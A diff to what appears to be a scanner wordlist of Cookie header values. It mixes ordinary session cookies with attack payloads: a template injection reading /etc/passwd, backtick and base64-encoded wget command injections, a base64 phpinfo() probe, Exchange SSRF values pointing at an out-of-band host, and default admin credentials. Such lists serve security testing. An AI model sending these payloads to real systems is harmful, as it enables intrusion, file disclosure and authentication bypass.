@@ -11,7 +11,9 @@ Authorization=Basic dGVsZWNvbWFkbWluOnN1cGVyYWRtaW4=
 Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
 Authorization=Basic%20YWRtaW46NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk=
 Authorization=Basic%20dXNlcjplZTExY2JiMTkwNTJlNDBiMDdhYWMwY2EwNjBjMjNlZQ==
+CMX_SAVED_ID=zero; CMX_ADMIN_ID=science; CMX_ADMIN_NM=liquidworm; CMX_ADMIN_LV=9; CMX_COMPLEX_NM=ZSL; CMX_COMPLEX_IP=2.5.1.0
 CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl
+CURLTOKEN=b35fcdc1ea1221e6dd126e172a0131c5a; SESSIONID=admin
 D66EEE1927424A0C7A30387777FC6B9ED66EEE19
 DESKTOP=1; direct_to_monitor=0; nas_lang=ENG
 Email=autodiscover/autodiscover.json?a=a@127.0.0.1
@@ -27,15 +29,18 @@ LoginTimes=1; SESSIONID=boasid4566b876; UID=user3; PSW=1234
 PHPSESSID=20HyDW61oD9wwmZAMXh4iVVeoiQ
 PHPSESSID=2M7JbMwdDZC8nTQ1BRO1oiCacfD;
 PHPSESSID=a0d5959357e474aef655313f69891f37
+STATE_COOKIE=&_REQS/_TIME/123
 TWISTED_SESSION=no
 X-AnonResource=true; X-AnonResource-Backend=cfrbcab952g0buu01fh0sx8sdew4q5exc.oast.pro/ecp/default.flt?~3;
 X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;
 X-BEResource=/EWS/Exchange.asmx?a=~1942062522;
+X-BEResource=@google.com:443/search#~1;
 X-BEResource=localhost~1942062522
 Y=DnyP5/s0JCRbgFZfv+L49q5hjuwhM+cfmrOUmC/Qj+hsWi3MPFPhoKX6YY4QR3xq3LXYBSuYMohEoVpn99O7aHg6El3UXR46+T7GyRx6pG/PeAROHwJNFnv+ShXtJyXIpvRaxxHicC+NyQv6Wj7lIAVF76Vu16/MNpIxuTQl5dKXxUSDspRmYq6Qrfzu77PqvFYLSLEUKYnVrpIji2EhWAyvbB8sNyJVtOrbHqUIkNdp5QClV05ZV/j9CFf3eyujxfKJYqjX2NQLZos4PqE/G612ixvROlyuB+IgILK0zSSV+28=
 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
 __cfduid=387d46e23866efcf2b16a2169d68e2e485d1af9f775d
 __cfduid=4e8d79b4192881afa5bbd2f59f826e9a43719f9f3270
+__cfduid=RFjaM9vT3BSiKEJHx6tHzRx5bJUEy8-BKzEv-dF3ghjDeJEVrVoAmMDFpNdByB-gkSfbSSeQ6IMYrNSbH2QRGsO-AmPd4jqbl1fWuWj1MggiJ2zefVQLztmZ7hnykINE_oRx0uzY97vFvZ1IwhIzRdJ9tFd_1E55PHMJpS5b-Os
 _csrf=baacbabcabcaaccaababcbbcabacababaabaccbacaabaabbcbbcac;
 _ga=GA1.2.163966002.1612866791
 _ga=GA1.2.163966002.1612866791; _gid=GA1.2.1280108070.1620745746
@@ -43,11 +48,13 @@ _ga=GA1.2.163966002.1612866791; _gid=GA1.2.353732362.1622924102
 _ga=GA1.2.163966002.1612866791; _gid=GA1.2.353732362.1622924102; connect.sid=s%3Aqan2w5uoqUzMo3M4xTk6DnLr_4_ht_PN.gwcqAgmuoW4iAG9CUikvG4NqCK6tB1JCFPYC0SRz3Ao
 _ga=GA1.2.KNAWLVT5s2OaA36Y3vu4MDrXnUP_wj36MB7GzK8%3D
 ab3b3b1357c29e970336d06a3b76dcf6=caf9b6b99962bf5c2264824231d7a40c;
+ab=ab; c=cGhwaW5mbygpOw==; d=; e=;
 admin:language=en; path=/
 c=cookie
 cookie=ok
 csrfCookie=e8951105786dfccc0abfa6a55442eb6c70c8aaf8-1635430439424-69a10d2ee4dfa1ee40757158
 csrftoken=
+ctr_t=0; sid=123456789
 d2dldCBodHRwOi8vMTI3LjAuMC4xLw==
 fake=fake_value
 hasLogin=1
@@ -61,7 +68,9 @@ language=en; language=en; username=admin
 mac=00%3A1a%3A79%3A00%3A00%3A09; stb_lang=en; timezone=Europe/Amsterdam; adid=
 mac=00:1a:79:00:00:09; stb_lang=en; timezone=Europe/Amsterdam;
 mac=; stb_lang=undefined; timezone=undefined; adid=
+my_cookie=AAEBAW5paGFv
 oInnSJKRfeFi=mEKiQrsvlaKxYknBCZ/m2QEp7Co=
+product=cpe; cpe_buildTime=201701020919; vendor=mobinnet; connType=lte; cpe_multiPdnEnable=1; cpe_lang=en; cpe_voip=0; cpe_cwmpc=1; cpe_snmp=1; filesharing=0; cpe_switchEnable=0; cpe_IPv6Enable=0; cpe_foc=0; cpe_vpn=1; cpe_httpsEnable=0; cpe_internetMTUEnable=0; cpe_opmode=lte; sessionTime=1631653385102; cpe_login=admin
 rememberMe=+2ewny/4XWAbAc9751f01TtmSLcxlwGmpMy2PSdrBq0=
 rememberMe=0
 rememberMe=1
@@ -70,9 +79,11 @@ rememberMe=axxxxxxxxxx123456
 rememberMe=me
 rememberMe=shodan
 rememberMe=test
+secure_id_EZRPZ3EL95P213EWTYSMZTE31PT86LYH=391xe-xTepRPYmzzYTiVFYzXxRSTPGC_Kuu7cRDI9k7pwGe74UwWzlZEUIbV29AmmpntVpHyuHm_uxzWHAFIrBpi-X4cOyMxUq8VTSlX3etRCtfWBFKg0fzYTi0InLw-1szUleeTI52756HXBwUSX9PlXlcl5BEjszyJwvaMASvYhC4N
 session=;
 sessionid='`wget http://127.0.0.1`'
 sesskey=
+siLockLongTermInstID=0
 sid=foo
 t('${d2dldCBodHRwOi8vMTI3LjAuMC4xLw==}')
 td_cookie=711915097
@@ -84,3 +95,4 @@ uid=admin
 userLanguage=EN; username=admin
 userLanguage=EN; username=null
 wordpress_test_cookie=WP+Cookie+check
+zbx_session=eyJ
